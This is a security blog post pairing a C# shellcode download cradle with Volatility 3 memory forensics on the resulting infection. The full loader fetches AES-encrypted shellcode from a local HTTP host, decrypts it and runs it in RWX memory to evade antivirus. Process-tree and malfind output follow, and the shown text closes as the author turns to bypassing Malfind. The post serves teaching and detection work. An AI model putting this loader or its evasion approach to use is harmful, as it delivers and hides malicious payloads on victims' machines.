<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>C2 Payload Hiding and Memory Forensics - 4xpl0r3r&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="4xpl0r3r&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="4xpl0r3r&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="There is a common method to execute a malicious payload in a download cradle to bypass the antivirus’ detection. Here I’m going to show you how to use volatility to perform memory forensics and extrac"><meta property="og:type" content="blog"><meta property="og:title" content="C2 Payload Hiding and Memory Forensics"><meta property="og:url" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/"><meta property="og:site_name" content="4xpl0r3r&#039;s blog"><meta property="og:description" content="There is a common method to execute a malicious payload in a download cradle to bypass the antivirus’ detection. Here I’m going to show you how to use volatility to perform memory forensics and extrac"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313131654181.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313132251260.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313133408825.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313151555724.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313151745065.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313152425113.png"><meta property="og:image" content="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313153029636.png"><meta property="article:published_time" content="2023-03-13T08:45:43.000Z"><meta property="article:modified_time" content="2023-03-13T08:58:29.598Z"><meta property="article:author" content="4xpl0r3r"><meta property="article:tag" content="Red Teaming"><meta property="article:tag" content="Blue Teaming"><meta property="article:tag" content="Memory Forensics"><meta property="article:tag" content="C2"><meta property="article:tag" content="PowerShell"><meta property="article:tag" content="C#"><meta property="article:tag" content="Antivirus Evasion"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="image-20230313131654181.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/"},"headline":"C2 Payload Hiding and Memory Forensics","image":["https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313131654181.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313132251260.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313133408825.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313151555724.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313151745065.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313152425113.png","https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/image-20230313153029636.png"],"datePublished":"2023-03-13T08:45:43.000Z","dateModified":"2023-03-13T08:58:29.598Z","author":{"@type":"Person","name":"4xpl0r3r"},"publisher":{"@type":"Organization","name":"4xpl0r3r's blog","logo":{"@type":"ImageObject","url":{"text":"4xpl0r3r"}}},"description":"There is a common method to execute a malicious payload in a download cradle to bypass the antivirus’ detection. Here I’m going to show you how to use volatility to perform memory forensics and extrac"}</script><link rel="canonical" href="https://www.4xpl0r3r.com/Red-Blue/C2-Payload-Hiding-and-Memory-Forensics/"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?3fec34a29e38d2bb96785908e568c11f";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-997MZZV1T0" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-997MZZV1T0');</script><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="follow_it-verification-code" content="7RZ9jE39c8SCaWnWQPl8"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4xpl0r3r's blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">4xpl0r3r</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-03-13T08:45:43.000Z" title="3/13/2023, 4:45:43 PM">2023-03-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-03-13T08:58:29.598Z" title="3/13/2023, 4:58:29 PM">2023-03-13</time></span><span class="level-item"><a class="link-muted" href="/categories/Red-Blue/">Red&amp;Blue</a></span><span class="level-item">16 minutes read (About 2354 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">C2 Payload Hiding and Memory Forensics</h1><div class="content"><p>There is a common method to execute a malicious payload in a download cradle to bypass the antivirus’ detection. Here I’m going to show you how to use volatility to perform memory forensics and extract malicious payloads from memory.</p>
<span id="more"></span>



<h2 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/HavocFramework/Havoc"><strong>Havoc Framework</strong></a></li>
<li><strong>Metasploit Framework</strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Gr1mmie/AtlasC2">AtlasC2</a></strong></li>
<li><strong>Visual Studio</strong></li>
<li><strong>dnSpy</strong></li>
</ul>
<h2 id="Memory-Forensics-with-Shellcode-Cradle"><a href="#Memory-Forensics-with-Shellcode-Cradle" class="headerlink" title="Memory Forensics with Shellcode Cradle"></a>Memory Forensics with Shellcode Cradle</h2><p>At the first, use the payload generator to generate a shellcode and encrypt it with AES. the encrypted payload is stored in “payload.jpeg” which will be rendered with the HTTP server, and put the IV and key into the Cradle code.</p>
<h3 id="My-Custom-Cradle"><a href="#My-Custom-Cradle" class="headerlink" title="My Custom Cradle"></a>My Custom Cradle</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Cradle1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>;</span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="built_in">string</span> <span class="title">DecryptStringFromBytes_Aes</span>(<span class="params"><span class="built_in">byte</span>[] cipherText, <span class="built_in">byte</span>[] Key, <span class="built_in">byte</span>[] IV</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (cipherText == <span class="literal">null</span> || cipherText.Length &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;cipherText&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (Key == <span class="literal">null</span> || Key.Length &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;Key&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (IV == <span class="literal">null</span> || IV.Length &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;IV&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> plaintext = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">using</span> (Aes aesAlg = Aes.Create())</span><br><span class="line">            &#123;</span><br><span class="line">                aesAlg.Key = Key;</span><br><span class="line">                aesAlg.IV = IV;</span><br><span class="line">                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);</span><br><span class="line">                <span class="keyword">using</span> (MemoryStream msDecrypt = <span class="keyword">new</span> MemoryStream(cipherText))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream csDecrypt = <span class="keyword">new</span> CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">using</span> (StreamReader srDecrypt = <span class="keyword">new</span> StreamReader(csDecrypt))</span><br><span class="line">                        &#123;</span><br><span class="line">                            plaintext = srDecrypt.ReadToEnd();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> plaintext;</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">STAThread</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">var</span> client = <span class="keyword">new</span> WebClient();</span><br><span class="line">                <span class="keyword">var</span> encrypted = client.DownloadString(<span class="string">&quot;http://192.168.2.2:1888/payload.jpeg&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> byteBuf = Convert.FromBase64String(encrypted);</span><br><span class="line">                <span class="keyword">var</span> key = Convert.FromBase64String(<span class="string">&quot;eYkR/wkF3FKtODdZk66SgW6lDLw4iIYrHcwE6Ei2vxk=&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> IV = Convert.FromBase64String(<span class="string">&quot;8T/TtAHKPkPe7UIC+PsBGg==&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> res = Encoding.GetEncoding(<span class="string">&quot;ISO-8859-1&quot;</span>).GetBytes(DecryptStringFromBytes_Aes(byteBuf, key, IV));</span><br><span class="line">                IntPtr addr = VirtualAlloc(IntPtr.Zero, (<span class="built_in">uint</span>)res.Length, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">                Marshal.Copy(res, <span class="number">0</span>, addr, res.Length);</span><br><span class="line">                IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br><span class="line">                WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Forensics-with-Volatility-3"><a href="#Forensics-with-Volatility-3" class="headerlink" title="Forensics with Volatility 3"></a>Forensics with Volatility 3</h3><p>After using DumpIt.exe or anything you like to exact the full memory dump, we can use volatility to perform forensics.</p>
<h4 id="Validate-Image"><a href="#Validate-Image" class="headerlink" title="Validate Image"></a>Validate Image</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memory_dump.raw windows.info</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Volatility 3 Framework 2.4.2</span><br><span class="line">Progress:  100.00               PDB scanning finished                                                                                              </span><br><span class="line">Variable        Value</span><br><span class="line"></span><br><span class="line">Kernel Base     0xf8061cc17000</span><br><span class="line">DTB     0x1ad000</span><br><span class="line">...</span><br><span class="line">Is64Bit True</span><br><span class="line">IsPAE   False</span><br><span class="line">layer_name      0 WindowsIntel32e</span><br><span class="line">memory_layer    1 FileLayer</span><br><span class="line">KdVersionBlock  0xf8061d826388</span><br><span class="line">Major/Minor     15.19041</span><br><span class="line">MachineType     34404</span><br><span class="line">KeNumberProcessors      2</span><br><span class="line">SystemTime      2023-03-09 05:23:04</span><br><span class="line">NtSystemRoot    C:\Windows</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  10</span><br><span class="line">NtMinorVersion  0</span><br><span class="line">PE MajorOperatingSystemVersion  10</span><br><span class="line">PE MinorOperatingSystemVersion  0</span><br><span class="line">PE Machine      34404</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>It looks volatility works well with this image</p>
<h4 id="Check-Process-Tree"><a href="#Check-Process-Tree" class="headerlink" title="Check Process Tree"></a>Check Process Tree</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memory_dump.raw windows.pstree</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime</span><br><span class="line"></span><br><span class="line">4       0       System  0xd30ee5482080  139     -       N/A     False   2023-03-09 04:44:09.000000      N/A</span><br><span class="line">* 312   4       smss.exe        0xd30ee81ea040  2       -       N/A     False   2023-03-09 04:44:09.000000      N/A</span><br><span class="line">* 1576  4       MemCompression  0xd30ee9eb4040  26      -       N/A     False   2023-03-09 04:44:12.000000      N/A</span><br><span class="line">* 92    4       Registry        0xd30ee54e9080  4       -       N/A     False   2023-03-09 04:44:04.000000      N/A</span><br><span class="line">520     500     csrss.exe       0xd30ee893e080  11      -       1       False   2023-03-09 04:44:10.000000      N/A</span><br><span class="line">608     500     winlogon.exe    0xd30ee89c8080  3       -       1       False   2023-03-09 04:44:10.000000      N/A</span><br><span class="line">* 816   608     fontdrvhost.ex  0xd30ee9a59080  5       -       1       False   2023-03-09 04:44:11.000000      N/A</span><br><span class="line">* 992   608     LogonUI.exe     0xd30ee9d37080  10      -       1       False   2023-03-09 04:44:11.000000      N/A</span><br><span class="line">* 1000  608     dwm.exe 0xd30ee9d39080  13      -       1       False   2023-03-09 04:44:11.000000      N/A</span><br><span class="line">4076    4068    csrss.exe       0xd30eeab87140  12      -       2       False   2023-03-09 04:46:59.000000      N/A</span><br><span class="line">1256    4068    winlogon.exe    0xd30eea6c2080  6       -       2       False   2023-03-09 04:46:59.000000      N/A</span><br><span class="line">* 2800  1256    dwm.exe 0xd30eea704240  15      -       2       False   2023-03-09 04:47:00.000000      N/A</span><br><span class="line">* 4604  1256    userinit.exe    0xd30eebadf080  0       -       2       False   2023-03-09 04:47:02.000000      2023-03-09 04:47:38.000000 </span><br><span class="line">** 4620 4604    explorer.exe    0xd30eebaf8080  75      -       2       False   2023-03-09 04:47:02.000000      N/A</span><br><span class="line">*** 5508        4620    a.exe   0xd30ee8494080  14      -       2       False   2023-03-09 05:22:18.000000      N/A</span><br><span class="line">*** 6884        4620    OneDrive.exe    0xd30eebcb0080  19      -       2       True    2023-03-09 04:47:29.000000      N/A</span><br><span class="line">*** 4776        4620    powershell.exe  0xd30eec77a080  13      -       2       False   2023-03-09 05:04:21.000000      N/A</span><br><span class="line">**** 3668       4776    conhost.exe     0xd30eebbbd080  4       -       2       False   2023-03-09 05:04:21.000000      N/A</span><br><span class="line">*** 620 4620    msedge.exe      0xd30eec1c9080  28      -       2       False   2023-03-09 04:51:24.000000      N/A</span><br><span class="line">**** 4544       620     msedge.exe      0xd30eec8bd340  7       -       2       False   2023-03-09 04:51:24.000000      N/A</span><br><span class="line">**** 6816       620     msedge.exe      0xd30eebbfa080  14      -       2       False   2023-03-09 04:51:25.000000      N/A</span><br><span class="line">**** 4480       620     msedge.exe      0xd30eec6aa080  13      -       2       False   2023-03-09 04:53:04.000000      N/A</span><br><span class="line">**** 4992       620     msedge.exe      0xd30eec7df0c0  12      -       2       False   2023-03-09 05:07:46.000000      N/A</span><br><span class="line">**** 3564       620     msedge.exe      0xd30eec086080  13      -       2       False   2023-03-09 05:00:49.000000      N/A</span><br><span class="line">**** 6840       620     msedge.exe      0xd30eebf52080  11      -       2       False   2023-03-09 04:51:25.000000      N/A</span><br><span class="line">**** 1788       620     msedge.exe      0xd30eebcca300  8       -       2       False   2023-03-09 04:51:25.000000      N/A</span><br><span class="line">*** 5172        4620    DumpIt.exe      0xd30eeb9e6080  3       -       2       True    2023-03-09 05:22:56.000000      N/A</span><br><span class="line">**** 5432       5172    conhost.exe     0xd30eeb9110c0  6       -       2       False   2023-03-09 05:22:56.000000      N/A</span><br><span class="line">*** 6392        4620    vmtoolsd.exe    0xd30eec0b22c0  6       -       2       False   2023-03-09 04:47:27.000000      N/A</span><br><span class="line">* 2572  1256    fontdrvhost.ex  0xd30eeab8e140  5       -       2       False   2023-03-09 04:47:00.000000      N/A</span><br></pre></td></tr></table></figure>

<p>We can find our suspicious process is a child process of “explorer.exe” and the PID of it is 5508. There will be a lot of approach to determine whether a process is suspicious like EDR or dubious inheritance.</p>
<h4 id="Locate-Injected-Code"><a href="#Locate-Injected-Code" class="headerlink" title="Locate  Injected Code"></a>Locate  Injected Code</h4><p>Check injected with following command</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python volatility3/vol.py -f memory_dump.raw windows.malfind.Malfind --pid 5508</span><br></pre></td></tr></table></figure>

<p>According to the result, we can see it found several injected code because they have <code>PAGE_EXECUTE_READWRITE</code> protection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">PID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Hexdump Disasm</span><br><span class="line"></span><br><span class="line">5508    a.exe   0x1f4510e0000   0x1f4510effff   VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled</span><br><span class="line">00 00 00 00 00 00 00 00 ........</span><br><span class="line">ef da 1c 5e 56 c0 00 01 ...^V...</span><br><span class="line">ee ff ee ff 02 00 00 00 ........</span><br><span class="line">...</span><br><span class="line">0x1f4510e0000:  add     byte ptr [rax], al</span><br><span class="line">0x1f4510e0002:  add     byte ptr [rax], al</span><br><span class="line">0x1f4510e0004:  add     byte ptr [rax], al</span><br><span class="line">0x1f4510e0006:  add     byte ptr [rax], al</span><br><span class="line">0x1f4510e0008:  out     dx, eax</span><br><span class="line">...</span><br><span class="line">5508    a.exe   0x1f450ed0000   0x1f450ee0fff   VadS    PAGE_EXECUTE_READWRITE  17      1       Disabled</span><br><span class="line">56 48 89 e6 48 83 e4 f0 VH..H...</span><br><span class="line">48 83 ec 20 e8 0f 00 00 H.......</span><br><span class="line">00 48 89 f4 5e c3 66 2e .H..^.f.</span><br><span class="line">...</span><br><span class="line">0x1f450ed0000:  push    rsi</span><br><span class="line">0x1f450ed0001:  mov     rsi, rsp</span><br><span class="line">0x1f450ed0004:  and     rsp, 0xfffffffffffffff0</span><br><span class="line">0x1f450ed0008:  sub     rsp, 0x20</span><br><span class="line">0x1f450ed000c:  call    0x1f450ed0020</span><br><span class="line">0x1f450ed0011:  mov     rsp, rsi</span><br><span class="line">0x1f450ed0014:  pop     rsi</span><br><span class="line">...</span><br><span class="line">5508    a.exe   0x1f451030000   0x1f45103ffff   VadS    PAGE_EXECUTE_READWRITE  16      1       Disabled</span><br><span class="line">4c 8b d1 b8 02 00 00 00 L.......</span><br><span class="line">49 bb f2 dd 3c f0 fb 7f I...&lt;...</span><br><span class="line">00 00 41 ff e3 c3 00 00 ..A.....</span><br><span class="line">...</span><br><span class="line">0x1f451030000:  mov     r10, rcx</span><br><span class="line">0x1f451030003:  mov     eax, 2</span><br><span class="line">0x1f451030008:  movabs  r11, 0x7ffbf03cddf2</span><br><span class="line">0x1f451030012:  jmp     r11</span><br><span class="line">0x1f451030015:  ret</span><br><span class="line">0x1f451030016:  add     byte ptr [rax], al</span><br><span class="line">0x1f451030018:  add     byte ptr [rax], al</span><br><span class="line">0x1f45103001a:  add     byte ptr [rax], al</span><br><span class="line">...</span><br><span class="line">5508    a.exe   0x1f451080000   0x1f45108ffff   VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled</span><br><span class="line">00 00 00 00 00 00 00 00 ........</span><br><span class="line">11 6d d2 d9 da 56 00 01 .m...V..</span><br><span class="line">ee ff ee ff 02 00 00 00 ........</span><br><span class="line">...</span><br><span class="line">0x1f451080000:  add     byte ptr [rax], al</span><br><span class="line">0x1f451080002:  add     byte ptr [rax], al</span><br><span class="line">0x1f451080004:  add     byte ptr [rax], al</span><br><span class="line">0x1f451080006:  add     byte ptr [rax], al</span><br><span class="line">...</span><br><span class="line">5508    a.exe   0x7ff4a8c00000  0x7ff4a8c9ffff  VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled</span><br><span class="line">d8 ff ff ff ff ff ff ff ........</span><br><span class="line">08 00 00 00 00 00 00 00 ........</span><br><span class="line">...</span><br><span class="line">5508    a.exe   0x7ff4a8bf0000  0x7ff4a8bfffff  VadS    PAGE_EXECUTE_READWRITE  1       1       Disabled</span><br><span class="line">00 00 00 00 00 00 00 00 ........</span><br><span class="line">78 0d 00 00 00 00 00 00 x.......</span><br><span class="line">...</span><br><span class="line">0x7ff4a8bf0000: add     byte ptr [rax], al</span><br><span class="line">0x7ff4a8bf0002: add     byte ptr [rax], al</span><br><span class="line">0x7ff4a8bf0004: add     byte ptr [rax], al</span><br><span class="line">0x7ff4a8bf0006: add     byte ptr [rax], al</span><br><span class="line">0x7ff4a8bf0008: js      0x7ff4a8bf0017</span><br><span class="line">0x7ff4a8bf000a: add     byte ptr [rax], al</span><br><span class="line">0x7ff4a8bf000c: add     byte ptr [rax], al</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Obviously, our malicious code has been located, it’s easy to be extracted with option “–dump”. </p>
<h5 id="Try-to-bypass-the-Malfind"><a href="#Try-to-bypass-the-Malfind" class="headerlink" title="Try to bypass the Malfind"></a>Try to bypass the Malfind</h5><p>However, can we bypass this check? let’s check the source code of volatility, <a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3/blob/0245988fab6b19046df03b6e025561cdb9a0b726/volatility3/framework/plugins/windows/malfind.py#L124">here</a> we can find it.</p>
